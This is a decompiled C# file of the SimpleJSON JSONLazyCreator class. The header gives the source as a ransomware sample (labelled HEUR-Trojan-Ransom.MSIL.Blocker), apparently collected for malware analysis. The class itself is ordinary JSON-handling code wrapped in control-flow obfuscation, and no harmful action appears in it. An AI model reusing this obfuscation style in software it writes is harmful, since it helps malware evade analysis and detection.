// Decompiled with JetBrains decompiler
// Type: SimpleJSON.JSONLazyCreator
// Assembly: IMuiResourceTypeIdIntEnt, Version=2.0.4.0, Culture=neutral, PublicKeyToken=null
// MVID: 108B0C51-A542-4D1F-972B-8772D9255CD7
// Assembly location: C:\Users\Administrateur\Downloads\Bazaar.2022.02-msil\HEUR-Trojan-Ransom.MSIL.Blocker.gen-77eaed5cde7243b357db648d37fafd906220fc6f0c415561162e6fe5a1c39959.exe

namespace SimpleJSON
{
  internal class JSONLazyCreator : JSONNode
  {
    private JSONNode m_Node = (JSONNode) null;
    private string m_Key = (string) null;

    public JSONLazyCreator(JSONNode aNode)
    {
label_1:
      int num1 = -906569239;
      while (true)
      {
        uint num2;
        switch ((num2 = (uint) (num1 ^ -1058232030)) % 6U)
        {
          case 0:
            this.m_Key = (string) null;
            num1 = (int) num2 * -1395355676 ^ -518734681;
            continue;
          case 1:
            goto label_3;
          case 2:
            goto label_1;
          case 3:
            num1 = (int) num2 * 687177476 ^ -1055007326;
            continue;
          case 4:
            this.m_Node = aNode;
            num1 = (int) num2 * -1277386900 ^ -2134806380;
            continue;
          case 5:
            num1 = (int) num2 * -813549796 ^ -611231805;
            continue;
          default:
            goto label_8;
        }
      }
label_3:
      return;
label_8:;
    }

    public JSONLazyCreator(JSONNode aNode, string aKey)
    {
      this.m_Node = aNode;
      this.m_Key = aKey;
    }

    private void Set(JSONNode aVal)
    {
label_1:
      int num1 = -1223426618;
      bool flag;
      while (true)
      {
        uint num2;
        switch ((num2 = (uint) (num1 ^ -1205905352)) % 12U)
        {
          case 1:
            num1 = (int) num2 * -614322991 ^ -1729992959;
            continue;
          case 2:
            flag = this.m_Key == null;
            num1 = (int) num2 * 1669022135 ^ 434729636;
            continue;
          case 3:
            num1 = (int) num2 * 548395629 ^ -973087965;
            continue;
          case 4:
            this.m_Node.Add(aVal);
            num1 = (int) num2 * -1511325847 ^ 1639033285;
            continue;
          case 5:
            num1 = -1090838673;
            continue;
          case 6:
            int num3 = flag ? 957453271 : (num3 = 1992164279);
            num1 = num3 ^ (int) num2 * 1235598123;
            continue;
          case 7:
            num1 = (int) num2 * -1508829571 ^ 1771111008;
            continue;
          case 8:
            goto label_1;
          case 9:
            num1 = (int) num2 * 1491567158 ^ 393827960;
            continue;
          case 10:
            num1 = (int) num2 * -1814133057 ^ -2137645218;
            continue;
          case 11:
            this.m_Node.Add(this.m_Key, aVal);
            num1 = (int) num2 * -569433802 ^ 1772715365;
            continue;
          default:
            goto label_13;
        }
      }
label_13:
      this.m_Node = (JSONNode) null;
    }

    public override JSONNode this[int aIndex]
    {
      get => (JSONNode) new JSONLazyCreator((JSONNode) this);
      set
      {
        JSONArray aVal = new JSONArray();
        aVal.Add(value);
label_1:
        int num1 = -845340675;
        while (true)
        {
          uint num2;
          switch ((num2 = (uint) (num1 ^ -660520178)) % 3U)
          {
            case 0:
              goto label_1;
            case 1:
              goto label_3;
            case 2:
              this.Set((JSONNode) aVal);
              num1 = (int) num2 * -1272460813 ^ 2004999867;
              continue;
            default:
              goto label_5;
          }
        }
label_3:
        return;
label_5:;
      }
    }

    public override JSONNode this[string aKey]
    {
      get
      {
label_1:
        int num1 = 1149158501;
        JSONNode jsonNode;
        while (true)
        {
          uint num2;
          switch ((num2 = (uint) (num1 ^ 1629303211)) % 4U)
          {
            case 0:
              goto label_1;
            case 2:
              jsonNode = (JSONNode) new JSONLazyCreator((JSONNode) this, aKey);
              num1 = (int) num2 * 1792840193 ^ -1343423598;
              continue;
            case 3:
              num1 = (int) num2 * -2108720683 ^ 2047897777;
              continue;
            default:
              goto label_5;
          }
        }
label_5:
        return jsonNode;
      }
      set
      {
label_1:
        int num1 = 1259886081;
        JSONClass aVal;
        while (true)
        {
          uint num2;
          switch ((num2 = (uint) (num1 ^ 1338993072)) % 4U)
          {
            case 0:
              this.Set((JSONNode) aVal);
              num1 = (int) num2 * 2044651852 ^ 162510114;
              continue;
            case 1:
              aVal = new JSONClass();
              aVal.Add(aKey, value);
              num1 = (int) num2 * 516632182 ^ 725989710;
              continue;
            case 2:
              goto label_3;
            case 3:
              goto label_1;
            default:
              goto label_6;
          }
        }
label_3:
        return;
label_6:;
      }
    }

    public override void Add(JSONNode aItem)
    {
label_1:
      int num1 = 1532075512;
      while (true)
      {
        uint num2;
        switch ((num2 = (uint) (num1 ^ 1821111501)) % 3U)
        {
          case 0:
            goto label_1;
          case 1:
            goto label_3;
          case 2:
            JSONArray aVal = new JSONArray();
            aVal.Add(aItem);
            this.Set((JSONNode) aVal);
            num1 = (int) num2 * 288998731 ^ 219790181;
            continue;
          default:
            goto label_5;
        }
      }
label_3:
      return;
label_5:;
    }

    public override void Add(string aKey, JSONNode aItem)
    {
      JSONClass aVal = new JSONClass();
label_1:
      int num1 = -1871600977;
      while (true)
      {
        uint num2;
        switch ((num2 = (uint) (num1 ^ -165879584)) % 5U)
        {
          case 0:
            goto label_1;
          case 1:
            aVal.Add(aKey, aItem);
            num1 = (int) num2 * -1486966730 ^ 1935099490;
            continue;
          case 2:
            goto label_3;
          case 3:
            this.Set((JSONNode) aVal);
            num1 = (int) num2 * -2018679306 ^ -1403942134;
            continue;
          case 4:
            num1 = (int) num2 * 1406802968 ^ 1869873759;
            continue;
          default:
            goto label_7;
        }
      }
label_3:
      return;
label_7:;
    }

    public static bool operator ==(JSONLazyCreator a, object b)
    {
      bool flag1 = b == null;
label_1:
      int num1 = -1508199263;
      bool flag2;
      while (true)
      {
        uint num2;
        switch ((num2 = (uint) (num1 ^ -875883789)) % 7U)
        {
          case 0:
            flag2 = true;
            num1 = (int) num2 * -1758725028 ^ 1762099806;
            continue;
          case 1:
            num1 = (int) num2 * 1096482301 ^ 854058202;
            continue;
          case 2:
            goto label_1;
          case 3:
            num1 = (int) num2 * 1344371307 ^ 1905690859;
            continue;
          case 5:
            flag2 = (object) a == b;
            num1 = -29323033;
            continue;
          case 6:
            int num3 = !flag1 ? -598698986 : (num3 = -980065700);
            num1 = num3 ^ (int) num2 * -1963142089;
            continue;
          default:
            goto label_8;
        }
      }
label_8:
      return flag2;
    }

    public static bool operator !=(JSONLazyCreator a, object b)
    {
      bool flag = !(a == b);
label_1:
      int num1 = 145297174;
      while (true)
      {
        uint num2;
        switch ((num2 = (uint) (num1 ^ 82768997)) % 3U)
        {
          case 0:
            goto label_1;
          case 2:
            num1 = (int) num2 * 849005174 ^ 944356700;
            continue;
          default:
            goto label_4;
        }
      }
label_4:
      return flag;
    }

    public override bool Equals(object obj)
    {
      if (obj != null)
        goto label_4;
label_1:
      int num1 = 1194681133;
label_2:
      bool flag;
      while (true)
      {
        uint num2;
        switch ((num2 = (uint) (num1 ^ 1314804804)) % 6U)
        {
          case 0:
            goto label_1;
          case 1:
            goto label_4;
          case 2:
            num1 = (int) num2 * -89857124 ^ -425755777;
            continue;
          case 3:
            flag = true;
            num1 = (int) num2 * 1089316074 ^ -1593825582;
            continue;
          case 4:
            num1 = (int) num2 * 1670730229 ^ -1861067021;
            continue;
          default:
            goto label_7;
        }
      }
label_7:
      return flag;
label_4:
      flag = (object) this == obj;
      num1 = 1636089256;
      goto label_2;
    }

    public override int GetHashCode()
    {
label_1:
      int num1 = 1414703923;
      int hashCode;
      while (true)
      {
        uint num2;
        switch ((num2 = (uint) (num1 ^ 1004023276)) % 4U)
        {
          case 0:
            goto label_1;
          case 1:
            num1 = (int) num2 * -1671713906 ^ 556075508;
            continue;
          case 3:
            hashCode = base.GetHashCode();
            num1 = (int) num2 * -614411055 ^ 1849140338;
            continue;
          default:
            goto label_5;
        }
      }
label_5:
      return hashCode;
    }

    public override string ToString() => "";

    public override string ToString(string aPrefix)
    {
      string str = "";
label_1:
      int num1 = -1596995968;
      while (true)
      {
        uint num2;
        switch ((num2 = (uint) (num1 ^ -1635805364)) % 3U)
        {
          case 0:
            goto label_1;
          case 1:
            num1 = (int) num2 * 978818850 ^ -222226950;
            continue;
          default:
            goto label_4;
        }
      }
label_4:
      return str;
    }

    public override int AsInt
    {
      get
      {
label_1:
        int num1 = -1525730809;
        int asInt;
        while (true)
        {
          uint num2;
          switch ((num2 = (uint) (num1 ^ -2107874870)) % 6U)
          {
            case 0:
              num1 = (int) num2 * -416226657 ^ 1786140523;
              continue;
            case 2:
              num1 = (int) num2 * 1227245741 ^ 924552501;
              continue;
            case 3:
              asInt = 0;
              num1 = (int) num2 * -2098338883 ^ -355879221;
              continue;
            case 4:
              goto label_1;
            case 5:
              this.Set((JSONNode) new JSONData(0));
              num1 = (int) num2 * 821675465 ^ 1496490819;
              continue;
            default:
              goto label_7;
          }
        }
label_7:
        return asInt;
      }
      set
      {
        JSONData aVal = new JSONData(value);
label_1:
        int num1 = -960001915;
        while (true)
        {
          uint num2;
          switch ((num2 = (uint) (num1 ^ -1991408664)) % 3U)
          {
            case 0:
              goto label_1;
            case 1:
              this.Set((JSONNode) aVal);
              num1 = (int) num2 * -892009872 ^ -673928304;
              continue;
            case 2:
              goto label_3;
            default:
              goto label_5;
          }
        }
label_3:
        return;
label_5:;
      }
    }

    public override float AsFloat
    {
      get
      {
label_1:
        int num1 = 1776479312;
        JSONData aVal;
        float asFloat;
        while (true)
        {
          uint num2;
          switch ((num2 = (uint) (num1 ^ 1910116149)) % 5U)
          {
            case 0:
              this.Set((JSONNode) aVal);
              asFloat = 0.0f;
              num1 = (int) num2 * 1164838907 ^ 2104333396;
              continue;
            case 1:
              num1 = (int) num2 * 685909011 ^ -874365369;
              continue;
            case 2:
              goto label_1;
            case 3:
              aVal = new JSONData(0.0f);
              num1 = (int) num2 * 135317686 ^ 1002484084;
              continue;
            default:
              goto label_6;
          }
        }
label_6:
        return asFloat;
      }
      set
      {
        JSONData aVal = new JSONData(value);
label_1:
        int num1 = 1233611201;
        while (true)
        {
          uint num2;
          switch ((num2 = (uint) (num1 ^ 1565205055)) % 3U)
          {
            case 0:
              goto label_1;
            case 1:
              this.Set((JSONNode) aVal);
              num1 = (int) num2 * 622249445 ^ 2110463857;
              continue;
            case 2:
              goto label_3;
            default:
              goto label_5;
          }
        }
label_3:
        return;
label_5:;
      }
    }

    public override double AsDouble
    {
      get
      {
        JSONData aVal = new JSONData(0.0);
label_1:
        int num1 = -1091840331;
        double asDouble;
        while (true)
        {
          uint num2;
          switch ((num2 = (uint) (num1 ^ -1238368868)) % 5U)
          {
            case 1:
              asDouble = 0.0;
              num1 = (int) num2 * 1970124912 ^ -51219290;
              continue;
            case 2:
              num1 = (int) num2 * -381758455 ^ -1504334068;
              continue;
            case 3:
              this.Set((JSONNode) aVal);
              num1 = (int) num2 * 2041224614 ^ -1713388239;
              continue;
            case 4:
              goto label_1;
            default:
              goto label_6;
          }
        }
label_6:
        return asDouble;
      }
      set
      {
label_1:
        int num1 = 848275159;
        JSONData aVal;
        while (true)
        {
          uint num2;
          switch ((num2 = (uint) (num1 ^ 2077572090)) % 4U)
          {
            case 0:
              goto label_1;
            case 1:
              aVal = new JSONData(value);
              num1 = (int) num2 * 978267355 ^ 1527423707;
              continue;
            case 2:
              this.Set((JSONNode) aVal);
              num1 = (int) num2 * -85242036 ^ -1598993491;
              continue;
            case 3:
              goto label_3;
            default:
              goto label_6;
          }
        }
label_3:
        return;
label_6:;
      }
    }

    public override bool AsBool
    {
      get
      {
label_1:
        int num1 = 570385534;
        bool asBool;
        while (true)
        {
          uint num2;
          switch ((num2 = (uint) (num1 ^ 1563633166)) % 5U)
          {
            case 0:
              asBool = false;
              num1 = (int) num2 * -1722371104 ^ -504280750;
              continue;
            case 1:
              this.Set((JSONNode) new JSONData(false));
              num1 = (int) num2 * 1837172143 ^ 1692918114;
              continue;
            case 3:
              num1 = (int) num2 * 987588281 ^ -1875746703;
              continue;
            case 4:
              goto label_1;
            default:
              goto label_6;
          }
        }
label_6:
        return asBool;
      }
      set
      {
        JSONData aVal = new JSONData(value);
label_1:
        int num1 = -2114807234;
        while (true)
        {
          uint num2;
          switch ((num2 = (uint) (num1 ^ -2095117580)) % 4U)
          {
            case 0:
              goto label_1;
            case 1:
              goto label_3;
            case 2:
              this.Set((JSONNode) aVal);
              num1 = (int) num2 * -1919611272 ^ 947125511;
              continue;
            case 3:
              num1 = (int) num2 * -2035487777 ^ -401078380;
              continue;
            default:
              goto label_6;
          }
        }
label_3:
        return;
label_6:;
      }
    }

    public override JSONArray AsArray
    {
      get
      {
label_1:
        int num1 = 1825419174;
        JSONArray aVal;
        JSONArray asArray;
        while (true)
        {
          uint num2;
          switch ((num2 = (uint) (num1 ^ 794984643)) % 6U)
          {
            case 0:
              num1 = (int) num2 * 1096087467 ^ -1080116945;
              continue;
            case 1:
              num1 = (int) num2 * -1846777168 ^ -1278539469;
              continue;
            case 2:
              asArray = aVal;
              num1 = (int) num2 * -1063544473 ^ 1076496323;
              continue;
            case 3:
              aVal = new JSONArray();
              this.Set((JSONNode) aVal);
              num1 = (int) num2 * -535156028 ^ -880885066;
              continue;
            case 5:
              goto label_1;
            default:
              goto label_7;
          }
        }
label_7:
        return asArray;
      }
    }

    public override JSONClass AsObject
    {
      get
      {
label_1:
        int num1 = 320769591;
        JSONClass aVal;
        JSONClass asObject;
        while (true)
        {
          uint num2;
          switch ((num2 = (uint) (num1 ^ 252450469)) % 6U)
          {
            case 0:
              num1 = (int) num2 * 1691437237 ^ 2035322770;
              continue;
            case 1:
              this.Set((JSONNode) aVal);
              num1 = (int) num2 * -6056276 ^ -1768492909;
              continue;
            case 2:
              aVal = new JSONClass();
              num1 = (int) num2 * -265290266 ^ 1959917522;
              continue;
            case 3:
              goto label_1;
            case 5:
              asObject = aVal;
              num1 = (int) num2 * -481700349 ^ -1223876842;
              continue;
            default:
              goto label_7;
          }
        }
label_7:
        return asObject;
      }
    }
  }
}
